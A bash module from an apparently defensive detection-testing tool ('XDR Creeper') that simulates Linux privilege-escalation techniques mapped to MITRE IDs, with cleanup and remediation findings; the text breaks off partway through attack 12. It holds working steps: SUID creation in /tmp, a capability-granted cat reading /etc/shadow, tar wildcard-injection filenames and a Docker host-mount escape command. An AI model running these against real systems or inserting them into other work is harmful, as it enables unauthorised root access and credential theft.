#!/bin/bash
# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  DLC-02: PRIVILEGE ESCALATION — Technical Privesc Vector Simulation        ║
# ║  Part of XDR Creeper | Author: Daniel Budyn | Greeneris | Red accent       ║
# ║  Usage: sudo ./newlife-core-linux.sh --dlc 02-privesc                      ║
# ╚══════════════════════════════════════════════════════════════════════════════╝

DLC_NAME="DLC-02: PRIVILEGE ESCALATION"
DLC_DESC="Technical privilege escalation vectors — SUID, capabilities, kernel, cron, docker, LD_PRELOAD"
DLC_MITRE="T1548 T1068 T1574 T1053 T1611 T1134 T1055 T1014"
DLC_RISK="CRITICAL"
DLC_ACCENT="${DLC_COLORS[02]:-\033[38;5;196m}"
DLC_TOTAL=15
PE_DARK='\033[38;5;88m'; PE_BASE='\033[38;5;196m'; PE_LIGHT='\033[38;5;210m'; PE_BRIGHT='\033[38;5;217m'; BG_PE='\033[48;5;88m'

DLC_ATTACKS="SUID/SGID binary discovery and classification
SUID binary creation (trigger alert)
Linux capabilities audit (CAP_NET_RAW, CAP_SETUID etc.)
Capabilities injection on test binary
World-writable PATH directories scan
Writable /etc and /usr file detection
Cron job hijack vectors (writable scripts, PATH abuse)
Wildcard injection simulation (tar, rsync)
LD_PRELOAD / LD_LIBRARY_PATH injection
Shared library hijack (DT_RPATH/RUNPATH)
Docker socket privilege escalation probe
Container escape indicators (cgroups, namespaces)
Kernel exploit surface analysis (version, modules)
/proc/sys security settings audit
NFS root_squash and mount option analysis"

pe_phase() { local n=$1; shift; local t="$1"; shift; local m="$1"
  echo ""; echo -e "${BG_PE}${W}                                                                              ${N}"
  echo -e "${BG_PE}${W}  ◆ PRIVESC ${n}/${DLC_TOTAL} : ${t}  ${N}"
  echo -e "${BG_PE}${W}  ◆ MITRE        : ${m}  ${N}"
  echo -e "${BG_PE}${W}                                                                              ${N}"; echo ""; sleep 1; }
pe_box_start() { echo -e "  ${PE_BASE}  ┌── ${1} ──────────────────────────────────────────┐${N}"; }
pe_box_line()  { echo -e "  ${PE_BASE}  │${N} $1"; }
pe_box_end()   { echo -e "  ${PE_BASE}  └──────────────────────────────────────────────────────────────┘${N}"; }
pe_alert()     { echo -e "  ${PE_BRIGHT}  ⚡ PRIVESC → $1${N}"; sleep 0.5; }
pe_explain() {
    local title="$1"; shift
    echo ""; echo -e "  ${PE_LIGHT}  ╭── 📖 ${title} ────────────────────────────────────────╮${N}"
    while [[ $# -gt 0 ]]; do echo -e "  ${PE_LIGHT}  │${N} ${D}$1${N}"; shift; done
    echo -e "  ${PE_LIGHT}  ╰──────────────────────────────────────────────────────────────╯${N}"; echo ""
}

# ═══════════════════════════════════════════════════════════════════════════════
# PE ATTACK 01: SUID/SGID BINARY DISCOVERY & CLASSIFICATION
# ═══════════════════════════════════════════════════════════════════════════════
pe_attack_01() {
    pe_phase 1 "SUID/SGID BINARY DISCOVERY" "T1548.001 Abuse Elevation: SUID/SGID"
    pe_explain "SUID/SGID — Instant Root" \
        "SUID binaries run with the FILE OWNER's privileges, not the" \
        "caller's. If a SUID binary has a shell escape (like vim, find," \
        "python), any user can get root. GTFOBins catalogues these." \
        "" \
        "What happens: full SUID/SGID scan, classified against GTFOBins."
    xdr "SUID/SGID binary scan — potential escalation vectors"
    pe_alert "Filesystem scan for setuid/setgid binaries"

    hack "Scanning for SUID binaries..."
    echo ""
    pe_box_start "SUID BINARIES (potential privesc)"
    local suid_count=0
    local -a known_dangerous=("nmap" "vim" "vi" "find" "awk" "python" "python3" "perl" "ruby" "bash" "sh" "env" "less" "more" "cp" "mv" "php" "node" "gcc" "gdb" "strace" "ltrace" "docker" "pkexec" "snap-confine")

    while IFS= read -r bin; do
        [[ -z "$bin" ]] && continue
        local owner; owner=$(stat -c '%U' "$bin" 2>/dev/null)
        local perms; perms=$(stat -c '%a' "$bin" 2>/dev/null)
        local base; base=$(basename "$bin")
        local danger=""

        for d in "${known_dangerous[@]}"; do
            [[ "$base" == "$d" ]] && { danger="${R} ⚠ EXPLOITABLE (GTFOBins)${N}"; break; }
        done

        if [[ -n "$danger" ]]; then
            pe_box_line "${R}${bin}${N}  ${perms}  owner:${owner}${danger}"
        else
            pe_box_line "${PE_LIGHT}${bin}${N}  ${perms}  owner:${owner}"
        fi
        suid_count=$((suid_count + 1))
    done < <(find / -perm -4000 -type f 2>/dev/null | head -30)
    pe_box_end

    echo ""
    hack "Scanning for SGID binaries..."
    local sgid_count
    sgid_count=$(find / -perm -2000 -type f 2>/dev/null | wc -l)
    result "SUID binaries: ${suid_count} | SGID binaries: ${sgid_count}"

    echo ""
    echo -e "  ${D}  ┌── GTFOBins REFERENCE ────────────────────────────────────────┐${N}"
    echo -e "  ${D}  │ https://gtfobins.github.io — SUID exploitation database     │${N}"
    echo -e "  ${D}  │ Any SUID binary with shell escape = instant root             │${N}"
    echo -e "  ${D}  └──────────────────────────────────────────────────────────────┘${N}"

    csv_log "PE_SUID" "discovery" "suid=$suid_count sgid=$sgid_count" "OK"
    show_finding "$([ $suid_count -gt 20 ] && echo MEDIUM || echo LOW)" \
        "SUID scan: ${suid_count} SUID + ${sgid_count} SGID binaries found"
    write_finding "PE-01" "SUID Discovery" "T1548.001" "SCANNED" \
        "$([ $suid_count -gt 20 ] && echo MEDIUM || echo LOW)" \
        "SUID=${suid_count} SGID=${sgid_count}" \
        "Review SUID binaries against GTFOBins. Remove unnecessary SUID bits."
}

# ═══════════════════════════════════════════════════════════════════════════════
# PE ATTACK 02: SUID BINARY CREATION (Alert Trigger)
# ═══════════════════════════════════════════════════════════════════════════════
pe_attack_02() {
    pe_phase 2 "SUID BINARY CREATION — Alert Trigger" "T1548.001 SUID Set on Binary"
    xdr "SUID bit set on binary — this MUST trigger a detection"

    pe_explain "SUID Creation — Detection Trigger" \
        "Creating a new SUID binary MUST trigger an alert." \
        "This tests whether your SIEM detects chmod u+s." \
        "Also checks if /tmp has nosuid (blocks SUID abuse)."
    pe_alert "chmod u+s on custom binary!"

    hack "Creating SUID test binary..."
    cp /bin/echo /tmp/.xdr_suid_test 2>/dev/null || true
    chmod u+s /tmp/.xdr_suid_test 2>/dev/null || true

    echo ""
    pe_box_start "SUID TEST ARTIFACT"
    ls -la /tmp/.xdr_suid_test 2>/dev/null | while read l; do pe_box_line "${R}${l}${N}"; done
    pe_box_line ""
    pe_box_line "${W}Verification:${N}"
    local perm; perm=$(stat -c '%a' /tmp/.xdr_suid_test 2>/dev/null)
    if [[ "$perm" == *4* ]] || stat -c '%A' /tmp/.xdr_suid_test 2>/dev/null | grep -q 's'; then
        pe_box_line "${R}⚠ SUID BIT IS SET — file has setuid permission${N}"
    else
        pe_box_line "${D}SUID bit not set (may have been blocked by mount options)${N}"
    fi
    pe_box_end

    run "Checking if /tmp is mounted with nosuid..."
    local tmp_mount
    tmp_mount=$(mount | grep "on /tmp " 2>/dev/null)
    if echo "$tmp_mount" | grep -q "nosuid"; then
        echo -e "  ${G}  ✔ /tmp has nosuid — SUID attack mitigated${N}"
    else
        echo -e "  ${Y}  ⚠ /tmp does NOT have nosuid — SUID binaries work here${N}"
    fi
    csv_log "PE_SUID" "create" "/tmp/.xdr_suid_test" "OK"

    logger -t "xdr-creeper" "PRIVESC: SUID bit set on /tmp/.xdr_suid_test"
    sleep 3
    hack "Cleanup: removing SUID binary..."
    rm -f /tmp/.xdr_suid_test
    ok "SUID test binary removed"; csv_log "PE_SUID" "cleanup" "removed" "OK"

    show_finding "HIGH" "SUID binary created in /tmp"
    write_finding "PE-02" "SUID Creation" "T1548.001" "EXECUTED" "HIGH" \
        "SUID binary created in /tmp" \
        "Alert on chmod +s. Mount /tmp with nosuid."
}

# ═══════════════════════════════════════════════════════════════════════════════
# PE ATTACK 03: LINUX CAPABILITIES AUDIT
# ═══════════════════════════════════════════════════════════════════════════════
pe_attack_03() {
    pe_phase 3 "LINUX CAPABILITIES AUDIT" "T1548 Abuse Elevation Control Mechanism"
    xdr "Capabilities scan — binaries with elevated caps"

    pe_explain "Linux Capabilities — SUID Without SUID" \
        "Capabilities grant specific kernel privileges to binaries" \
        "WITHOUT setting the SUID bit. cap_setuid = change UID," \
        "cap_sys_admin = mount filesystems, cap_net_raw = sniff packets."
    pe_alert "Capability-based privilege escalation vectors found"

    hack "Scanning all binaries for capabilities..."
    echo ""
    pe_box_start "CAPABILITIES FOUND"
    local cap_count=0
    local -a dangerous_caps=("cap_setuid" "cap_setgid" "cap_sys_admin" "cap_sys_ptrace" "cap_dac_override" "cap_dac_read_search" "cap_net_raw" "cap_sys_module" "cap_sys_rawio")

    while IFS= read -r capline; do
        [[ -z "$capline" ]] && continue
        local binary; binary=$(echo "$capline" | awk '{print $1}')
        local caps; caps=$(echo "$capline" | awk '{print $3}')
        local danger=""

        for dc in "${dangerous_caps[@]}"; do
            echo "$caps" | grep -qi "$dc" && { danger="${R} ⚠ ESCALATION RISK${N}"; break; }
        done

        pe_box_line "${PE_LIGHT}${binary}${N}"
        pe_box_line "  caps: ${D}${caps}${N}${danger}"
        cap_count=$((cap_count + 1))
    done < <(getcap -r / 2>/dev/null | head -25)
    [[ $cap_count -eq 0 ]] && pe_box_line "${D}No capabilities found on any binary${N}"
    pe_box_end

    echo ""
    echo -e "  ${W}  DANGEROUS CAPABILITIES REFERENCE:${N}"
    echo -e "  ${PE_BASE}    cap_setuid${N}          → can change UID → instant root"
    echo -e "  ${PE_BASE}    cap_sys_admin${N}        → mount, BPF, namespace → root"
    echo -e "  ${PE_BASE}    cap_sys_ptrace${N}       → inject into processes → code exec"
    echo -e "  ${PE_BASE}    cap_dac_override${N}     → bypass file read/write permissions"
    echo -e "  ${PE_BASE}    cap_dac_read_search${N}  → read any file on the system"
    echo -e "  ${PE_BASE}    cap_net_raw${N}          → raw sockets → packet sniffing"
    echo -e "  ${PE_BASE}    cap_sys_module${N}       → load kernel modules → full control"

    result "Binaries with capabilities: ${cap_count}"
    csv_log "PE_CAPS" "audit" "$cap_count binaries" "OK"

    show_finding "MEDIUM" "Capabilities scan completed"
    write_finding "PE-03" "Capabilities Audit" "T1548" "EXECUTED" "MEDIUM" \
        "Capabilities scan completed" \
        "Audit capabilities with getcap -r /. Remove unnecessary caps."
}

# ═══════════════════════════════════════════════════════════════════════════════
# PE ATTACK 04: CAPABILITY INJECTION ON TEST BINARY
# ═══════════════════════════════════════════════════════════════════════════════
pe_attack_04() {
    pe_phase 4 "CAPABILITY INJECTION — Test Binary" "T1548 Abuse Elevation / T1068 Exploitation"
    xdr "Capabilities set on binary — potential escalation"

    pe_explain "Capability Injection = Root Read" \
        "cap_dac_read_search lets a binary read ANY file." \
        "Combined with /bin/cat = read /etc/shadow without root." \
        "This demonstrates capabilities bypassing file permissions."
    pe_alert "setcap executed on binary in /tmp"

    hack "Creating test binary and injecting capabilities..."
    cp /bin/cat /tmp/.xdr_cap_test 2>/dev/null || true

    if command -v setcap &>/dev/null; then
        setcap cap_dac_read_search+ep /tmp/.xdr_cap_test 2>/dev/null || true
        echo ""
        pe_box_start "CAPABILITY INJECTION"
        pe_box_line "${R}/tmp/.xdr_cap_test${N}"
        local gcap; gcap=$(getcap /tmp/.xdr_cap_test 2>/dev/null)
        pe_box_line "  ${R}⚠ ${gcap}${N}"
        pe_box_line ""
        pe_box_line "${W}Impact: this binary can now read ANY file on the system${N}"
        pe_box_line "${W}Example: /tmp/.xdr_cap_test /etc/shadow${N}"
        pe_box_end

        hack "Testing capability — attempting to read /etc/shadow header..."
        local shadow_test
        shadow_test=$(/tmp/.xdr_cap_test /etc/shadow 2>/dev/null | head -1)
        if [[ -n "$shadow_test" ]]; then
            result "cap_dac_read_search WORKS — shadow readable via capability"
            csv_log "PE_CAPS" "inject_test" "shadow readable" "CRITICAL"
        else
            info "Capability test inconclusive"
            csv_log "PE_CAPS" "inject_test" "inconclusive" "OK"
        fi
    else
        info "setcap not available — skipping injection test"
        csv_log "PE_CAPS" "inject" "setcap missing" "SKIP"
    fi

    logger -t "xdr-creeper" "PRIVESC: capability cap_dac_read_search set on /tmp/.xdr_cap_test"
    sleep 3
    hack "Cleanup: removing test binary..."
    rm -f /tmp/.xdr_cap_test
    ok "Capability test binary removed"; csv_log "PE_CAPS" "cleanup" "removed" "OK"

    show_finding "CRITICAL" "cap_dac_read_search injected on test binary"
    write_finding "PE-04" "Capability Injection" "T1068" "EXECUTED" "CRITICAL" \
        "cap_dac_read_search injected on test binary" \
        "Monitor setcap calls. Alert on capabilities in /tmp."
}

# ═══════════════════════════════════════════════════════════════════════════════
# PE ATTACK 05: WORLD-WRITABLE PATH DIRECTORIES
# ═══════════════════════════════════════════════════════════════════════════════
pe_attack_05() {
    pe_phase 5 "WORLD-WRITABLE PATH DIRECTORIES" "T1574.007 Path Interception by PATH Env Variable"
    xdr "Writable directories in PATH — command hijack possible"

    pe_explain "PATH Hijacking" \
        "If a directory in PATH is writable, an attacker can place" \
        "a malicious binary there. When a privileged user runs a" \
        "command, the attacker's binary executes first."
    pe_alert "PATH interception vulnerability scan"

    run "Analyzing PATH variable for writable directories..."
    echo ""
    pe_box_start "PATH ANALYSIS"
    local vuln_count=0
    IFS=':' read -ra PATH_DIRS <<< "$PATH"
    for dir in "${PATH_DIRS[@]}"; do
        if [[ -d "$dir" ]]; then
            local perms; perms=$(stat -c '%a' "$dir" 2>/dev/null)
            local writable=""
            if [[ -w "$dir" ]] && [[ "$dir" != "/usr/local/sbin" ]] && [[ "$dir" != "/usr/local/bin" ]]; then
                writable="${R} ⚠ WRITABLE${N}"
                vuln_count=$((vuln_count + 1))
            fi
            # Check world-writable
            if [[ "${perms: -1}" -ge 2 ]]; then
                writable="${R} ⚠ WORLD-WRITABLE${N}"
                vuln_count=$((vuln_count + 1))
            fi
            pe_box_line "$(printf '%-30s %s %s' "$dir" "$perms" "$writable")"
        else
            pe_box_line "$(printf '%-30s %s' "$dir" "${D}MISSING${N}")"
        fi
    done
    pe_box_end

    result "Writable PATH directories: ${vuln_count}"
    if [[ $vuln_count -gt 0 ]]; then
        warn "Attacker can place malicious binary in writable PATH dir → runs as victim"
    fi
    csv_log "PE_PATH" "scan" "vuln=$vuln_count" "OK"

    echo ""
    run "Checking PATH order — first match wins..."
    echo -e "  ${W}  PATH ORDER (first match executes):${N}"
    local idx=1
    for dir in "${PATH_DIRS[@]}"; do
        echo -e "  ${PE_BASE}    ${idx}. ${dir}${N}"
        idx=$((idx + 1))
    done
    info "Binary in earlier PATH dir overrides system binary"
    csv_log "PE_PATH" "order" "${#PATH_DIRS[@]} dirs" "OK"

    show_finding "MEDIUM" "PATH directories analyzed for writability"
    write_finding "PE-05" "PATH Analysis" "T1574.007" "EXECUTED" "MEDIUM" \
        "PATH directories analyzed for writability" \
        "Remove writable directories from PATH. Use absolute paths."
}

# ═══════════════════════════════════════════════════════════════════════════════
# PE ATTACK 06: WRITABLE SENSITIVE FILES SCAN
# ═══════════════════════════════════════════════════════════════════════════════
pe_attack_06() {
    pe_phase 6 "WRITABLE SENSITIVE FILES DETECTION" "T1574 Hijack Execution Flow"
    xdr "Scanning for writable files in /etc, /usr, /var"

    pe_explain "Writable System Files" \
        "World-writable files in /etc or /usr = direct config tampering." \
        "Writable cron scripts = code execution as root."
    pe_alert "Writable system files — potential for config hijack"

    hack "Scanning /etc for world-writable files..."
    echo ""
    pe_box_start "WRITABLE SYSTEM FILES"
    local wcount=0
    while IFS= read -r wfile; do
        [[ -z "$wfile" ]] && continue
        pe_box_line "${R}⚠ ${wfile}${N}  $(stat -c '%a %U:%G' "$wfile" 2>/dev/null)"
        wcount=$((wcount + 1))
    done < <(find /etc -writable -type f 2>/dev/null | head -15)
    [[ $wcount -eq 0 ]] && pe_box_line "${G}✔ No world-writable files in /etc${N}"
    pe_box_end
    csv_log "PE_WRITABLE" "etc_scan" "$wcount writable" "OK"

    echo ""
    hack "Scanning for writable scripts called by root crons..."
    echo -e "  ${W}  WRITABLE FILES REFERENCED IN CRONTABS:${N}"
    local cron_vuln=0
    for cronfile in /etc/crontab /etc/cron.d/* /var/spool/cron/crontabs/*; do
        [[ ! -f "$cronfile" ]] && continue
        grep -v '^#' "$cronfile" 2>/dev/null | grep -oP '/\S+' | while read script; do
            if [[ -f "$script" ]] && [[ -w "$script" ]]; then
                echo -e "  ${R}  ⚠ WRITABLE CRON SCRIPT: ${script}${N} (from ${cronfile})"
                cron_vuln=$((cron_vuln + 1))
            fi
        done
    done
    csv_log "PE_WRITABLE" "cron_scripts" "scanned" "OK"

    echo ""
    hack "Scanning /usr/local for writable binaries..."
    local usr_wcount=0
    while IFS= read -r wbin; do
        [[ -z "$wbin" ]] && continue
        echo -e "  ${Y}  ⚠ WRITABLE: ${wbin}${N}"
        usr_wcount=$((usr_wcount + 1))
    done < <(find /usr/local/bin /usr/local/sbin -writable -type f 2>/dev/null | head -10)
    [[ $usr_wcount -eq 0 ]] && echo -e "  ${G}  ✔ No writable binaries in /usr/local${N}"
    csv_log "PE_WRITABLE" "usr_local" "$usr_wcount writable" "OK"

    show_finding "MEDIUM" "Writable file scan completed"
    write_finding "PE-06" "Writable Files" "T1574" "EXECUTED" "MEDIUM" \
        "Writable file scan completed" \
        "Fix file permissions. Monitor /etc changes with FIM."
}

# ═══════════════════════════════════════════════════════════════════════════════
# PE ATTACK 07: CRON JOB HIJACK VECTORS
# ═══════════════════════════════════════════════════════════════════════════════
pe_attack_07() {
    pe_phase 7 "CRON JOB HIJACK VECTORS" "T1053.003 Scheduled Task: Cron"
    xdr "Cron job analysis — looking for hijackable scripts"

    pe_explain "Cron Hijack Vectors" \
        "Cron runs scripts as root. If a cron script is writable," \
        "an attacker modifies it to run their code. PATH abuse in" \
        "crontab allows binary substitution."
    pe_alert "Cron-based privilege escalation scan"

    run "Enumerating system cron jobs..."
    echo ""
    pe_box_start "SYSTEM CRONTAB (/etc/crontab)"
    if [[ -f /etc/crontab ]]; then
        grep -v '^#' /etc/crontab 2>/dev/null | grep -v '^$' | while read l; do
            pe_box_line "${D}${l}${N}"
        done
    else pe_box_line "${D}No /etc/crontab${N}"; fi
    pe_box_end
    csv_log "PE_CRON" "system_crontab" "enumerated" "OK"

    echo ""
    run "Scanning /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/..."
    for crondir in /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly; do
        if [[ -d "$crondir" ]]; then
            local fcount; fcount=$(ls "$crondir" 2>/dev/null | wc -l)
            echo -e "  ${PE_BASE}    ${crondir}/${N}  (${fcount} files)"
            # Check if any scripts are writable by non-root
            find "$crondir" -writable -not -user root -type f 2>/dev/null | while read f; do
                echo -e "  ${R}      ⚠ WRITABLE: ${f} ($(stat -c '%U' "$f" 2>/dev/null))${N}"
            done
        fi
    done
    csv_log "PE_CRON" "cron_dirs" "scanned" "OK"

    echo ""
    run "Checking cron PATH for hijack opportunities..."
    local cron_path
    cron_path=$(grep "^PATH" /etc/crontab 2>/dev/null | cut -d= -f2)
    if [[ -n "$cron_path" ]]; then
        echo -e "  ${W}  CRON PATH: ${cron_path}${N}"
        IFS=':' read -ra CDIRS <<< "$cron_path"
        for cd in "${CDIRS[@]}"; do
            [[ -w "$cd" ]] && echo -e "  ${R}  ⚠ WRITABLE CRON PATH DIR: ${cd}${N}"
        done
    fi
    csv_log "PE_CRON" "path_hijack" "checked" "OK"

    echo ""
    run "Checking systemd timers (modern cron alternative)..."
    echo -e "  ${W}  ACTIVE TIMERS:${N}"
    systemctl list-timers --no-pager 2>/dev/null | head -10 | while read l; do echo -e "  ${D}    ${l}${N}"; done
    csv_log "PE_CRON" "timers" "listed" "OK"

    show_finding "MEDIUM" "Cron configuration analyzed"
    write_finding "PE-07" "Cron Hijack" "T1053.003" "EXECUTED" "MEDIUM" \
        "Cron configuration analyzed" \
        "Verify cron script permissions. Use absolute paths in crontabs."
}

# ═══════════════════════════════════════════════════════════════════════════════
# PE ATTACK 08: WILDCARD INJECTION SIMULATION
# ═══════════════════════════════════════════════════════════════════════════════
pe_attack_08() {
    pe_phase 8 "WILDCARD INJECTION SIMULATION" "T1053.003 / T1059.004 Unix Shell"
    xdr "Wildcard injection — tar/rsync/chown with dangerous filenames"

    pe_explain "Wildcard Injection — Filenames as Arguments" \
        "tar with * expands filenames as arguments." \
        "File named '--checkpoint-action=exec=sh x' executes code." \
        "Affects: tar, rsync, chown, chmod with wildcards."
    pe_alert "Wildcard injection payload created"

    hack "Creating wildcard injection test directory..."
    local testdir="/tmp/.xdr_wildcard_test"
    mkdir -p "$testdir" 2>/dev/null
    cd "$testdir" || return

    # Create poisoned filenames for tar
    touch "$testdir/--checkpoint=1" 2>/dev/null || true
    touch "$testdir/--checkpoint-action=exec=sh payload.sh" 2>/dev/null || true
    echo '#!/bin/bash' > "$testdir/payload.sh" 2>/dev/null
    echo 'echo "XDR CREEPER: wildcard injection triggered" | logger -t xdr-creeper' >> "$testdir/payload.sh" 2>/dev/null
    touch "$testdir/normalfile1.txt" "$testdir/normalfile2.txt" 2>/dev/null

    echo ""
    pe_box_start "WILDCARD INJECTION — /tmp test dir"
    pe_box_line "${W}If a cron runs: tar czf backup.tar.gz *${N}"
    pe_box_line "${W}These filenames become tar arguments:${N}"
    pe_box_line ""
    ls -la "$testdir" 2>/dev/null | while read l; do
        pe_box_line "${D}${l}${N}"
    done
    pe_box_line ""
    pe_box_line "${R}⚠ '--checkpoint-action=exec=sh payload.sh' executes payload!${N}"
    pe_box_line "${R}⚠ This works because shell glob expands * before tar sees it${N}"
    pe_box_end

    echo ""
    echo -e "  ${W}  AFFECTED COMMANDS:${N}"
    echo -e "  ${PE_BASE}    tar${N}    → --checkpoint-action=exec"
    echo -e "  ${PE_BASE}    rsync${N}  → -e 'cmd' injection"
    echo -e "  ${PE_BASE}    chown${N}  → --reference=file"
    echo -e "  ${PE_BASE}    chmod${N}  → --reference=file"

    csv_log "PE_WILDCARD" "inject" "tar wildcard test" "OK"
    logger -t "xdr-creeper" "PRIVESC: wildcard injection test in $testdir"

    sleep 3
    hack "Cleanup..."
    rm -rf "$testdir"
    cd /tmp || true
    ok "Wildcard test directory removed"; csv_log "PE_WILDCARD" "cleanup" "removed" "OK"

    show_finding "MEDIUM" "Wildcard injection demonstrated in /tmp"
    write_finding "PE-08" "Wildcard Injection" "T1053.003" "EXECUTED" "MEDIUM" \
        "Wildcard injection demonstrated in /tmp" \
        "Never use * in privileged cron scripts. Quote arguments."
}

# ═══════════════════════════════════════════════════════════════════════════════
# PE ATTACK 09: LD_PRELOAD / LD_LIBRARY_PATH INJECTION
# ═══════════════════════════════════════════════════════════════════════════════
pe_attack_09() {
    pe_phase 9 "LD_PRELOAD / LD_LIBRARY_PATH INJECTION" "T1574.006 Shared Library Hijacking"
    xdr "LD_PRELOAD manipulation — shared library injection"

    pe_explain "LD_PRELOAD — Every Binary Compromised" \
        "/etc/ld.so.preload forces EVERY binary to load a library." \
        "An attacker's .so hooks any function: crypt, read, write." \
        "No process arguments visible — extremely stealthy."
    pe_alert "Dynamic linker hijack analysis"

    run "Checking current LD_PRELOAD..."
    local ldp="${LD_PRELOAD:-<not set>}"
    echo -e "  ${W}  LD_PRELOAD = ${ldp}${N}"

    echo ""
    run "Checking /etc/ld.so.preload..."
    if [[ -f /etc/ld.so.preload ]]; then
        echo -e "  ${R}  ⚠ /etc/ld.so.preload EXISTS:${N}"
        cat /etc/ld.so.preload 2>/dev/null | while read l; do echo -e "  ${R}    ${l}${N}"; done
        csv_log "PE_LDPRELOAD" "ld.so.preload" "exists" "CRITICAL"
    else
        echo -e "  ${G}  ✔ /etc/ld.so.preload does not exist${N}"
        csv_log "PE_LDPRELOAD" "ld.so.preload" "clean" "OK"
    fi

    echo ""
    run "Checking ld.so.conf library paths..."
    pe_box_start "LIBRARY SEARCH PATHS"
    ldconfig -v 2>/dev/null | grep '^/' | head -15 | while read l; do
        local writable=""
        local dir="${l%:}"
        [[ -w "$dir" ]] && writable="${R} ⚠ WRITABLE${N}"
        pe_box_line "${PE_LIGHT}${l}${N}${writable}"
    done
    pe_box_end
    csv_log "PE_LDPRELOAD" "ld_paths" "enumerated" "OK"

    echo ""
    hack "Simulating LD_PRELOAD injection (fake .so in /tmp)..."
    echo "/* XDR Creeper — fake preload library */" > /tmp/.xdr_preload_test.c 2>/dev/null
    result "Simulated source written to /tmp/.xdr_preload_test.c"
    info "Not compiling — this is a detection trigger only"
    logger -t "xdr-creeper" "PRIVESC: LD_PRELOAD injection simulation"
    csv_log "PE_LDPRELOAD" "inject_sim" "/tmp/.xdr_preload_test.c" "SIMULATED"

    sleep 2
    rm -f /tmp/.xdr_preload_test.c
    ok "Simulation file removed"; csv_log "PE_LDPRELOAD" "cleanup" "removed" "OK"

    show_finding "HIGH" "LD_PRELOAD attack surface analyzed"
    write_finding "PE-09" "LD_PRELOAD" "T1574.006" "EXECUTED" "HIGH" \
        "LD_PRELOAD attack surface analyzed" \
        "Monitor /etc/ld.so.preload with auditd. Check LD_PRELOAD env."
}

# ═══════════════════════════════════════════════════════════════════════════════
# PE ATTACK 10: SHARED LIBRARY RPATH/RUNPATH SCAN
# ═══════════════════════════════════════════════════════════════════════════════
pe_attack_10() {
    pe_phase 10 "SHARED LIBRARY RPATH/RUNPATH SCAN" "T1574.006 Shared Library Hijacking"
    xdr "DT_RPATH/DT_RUNPATH analysis — hardcoded library paths"

    pe_explain "RPATH/RUNPATH — Hardcoded Library Paths" \
        "SUID binaries with RPATH load libraries from fixed paths." \
        "If the RPATH directory is writable, plant a .so = root."
    pe_alert "Shared library hijack vectors"

    run "Scanning SUID binaries for hardcoded RPATH/RUNPATH..."
    echo ""
    pe_box_start "RPATH/RUNPATH IN SUID BINARIES"
    local rpath_count=0
    while IFS= read -r sbin; do
        [[ -z "$sbin" ]] && continue
        local rpath
        rpath=$(readelf -d "$sbin" 2>/dev/null | grep -E 'RPATH|RUNPATH')
        if [[ -n "$rpath" ]]; then
            pe_box_line "${R}⚠ ${sbin}${N}"
            pe_box_line "  ${D}${rpath}${N}"
            rpath_count=$((rpath_count + 1))
            # Check if the RPATH directory is writable
            local rdir
            rdir=$(echo "$rpath" | grep -oP '\[.*?\]' | tr -d '[]')
            [[ -d "$rdir" ]] && [[ -w "$rdir" ]] && pe_box_line "  ${R}⚠ RPATH DIR WRITABLE: ${rdir}${N}"
        fi
    done < <(find / -perm -4000 -type f 2>/dev/null | head -20)
    [[ $rpath_count -eq 0 ]] && pe_box_line "${G}✔ No SUID binaries with RPATH/RUNPATH${N}"
    pe_box_end

    result "SUID binaries with RPATH: ${rpath_count}"
    if [[ $rpath_count -gt 0 ]]; then
        warn "Writable RPATH + SUID = plant .so → executes as root"
    fi
    csv_log "PE_RPATH" "scan" "$rpath_count found" "OK"

    show_finding "MEDIUM" "RPATH/RUNPATH scan completed"
    write_finding "PE-10" "RPATH Scan" "T1574.006" "EXECUTED" "MEDIUM" \
        "RPATH/RUNPATH scan completed" \
        "Check SUID binaries with readelf -d. Remove RPATH from builds."
}

# ═══════════════════════════════════════════════════════════════════════════════
# PE ATTACK 11: DOCKER SOCKET PRIVILEGE ESCALATION
# ═══════════════════════════════════════════════════════════════════════════════
pe_attack_11() {
    pe_phase 11 "DOCKER SOCKET PRIVILEGE ESCALATION" "T1611 Escape to Host / T1548"
    xdr "Docker socket access — container breakout vector"

    pe_explain "Docker Socket = Root" \
        "Anyone who can write to /var/run/docker.sock can create a" \
        "container that mounts the host filesystem = full root access." \
        "Being in the docker group = being root."
    pe_alert "Docker socket privilege escalation probe"

    run "Checking Docker socket..."
    echo ""
    if [[ -S /var/run/docker.sock ]]; then
        echo -e "  ${R}  ⚠ DOCKER SOCKET ACCESSIBLE: /var/run/docker.sock${N}"
        echo -e "  ${D}  $(ls -la /var/run/docker.sock 2>/dev/null)${N}"
        csv_log "PE_DOCKER" "socket" "accessible" "CRITICAL"

        hack "Querying Docker API..."
        local containers
        containers=$(curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json 2>/dev/null)
        if [[ -n "$containers" ]] && [[ "$containers" != "[]" ]]; then
            echo -e "  ${W}  RUNNING CONTAINERS:${N}"
            echo "$containers" | grep -oP '"Names":\["/[^"]*"' 2>/dev/null | head -5 | while read c; do
                echo -e "  ${PE_BASE}    ${c}${N}"
            done
        else
            info "No running containers or API not accessible"
        fi

        hack "Checking Docker group membership..."
        echo -e "  ${W}  DOCKER GROUP MEMBERS:${N}"
        local dgrp; dgrp=$(getent group docker 2>/dev/null | cut -d: -f4)
        echo -e "  ${PE_BASE}    ${dgrp:-<none>}${N}"

        echo ""
        echo -e "  ${W}  ESCALATION PATH:${N}"
        echo -e "  ${PE_BASE}    docker run -v /:/host -it alpine chroot /host${N}"
        echo -e "  ${D}    ↑ mounts host root filesystem → full root access${N}"
    else
        echo -e "  ${G}  ✔ Docker socket not accessible${N}"
        csv_log "PE_DOCKER" "socket" "not found" "OK"
    fi

    echo ""
    run "Checking for other container runtimes..."
    for rt in podman containerd ctr nerdctl lxc; do
        command -v "$rt" &>/dev/null && echo -e "  ${Y}  ⚠ FOUND: ${rt} ($(${rt} --version 2>/dev/null | head -1))${N}"
    done
    csv_log "PE_DOCKER" "runtimes" "checked" "OK"

    show_finding "CRITICAL" "Docker socket accessibility checked"
    write_finding "PE-11" "Docker Socket" "T1611" "EXECUTED" "CRITICAL" \
        "Docker socket accessibility checked" \
        "Restrict docker group membership. Use rootless Docker."
}

# ═══════════════════════════════════════════════════════════════════════════════
# PE ATTACK 12: CONTAINER ESCAPE INDICATORS
# ═══════════════════════════════════════════════════════════════════════════════
pe_attack_12() {
    pe_phase 12 "CONTAINER ESCAPE INDICATORS" "T1611 Escape to Host"
    xdr "Container breakout indicator analysis"

    pe_explain "Container Escape Indicators" \
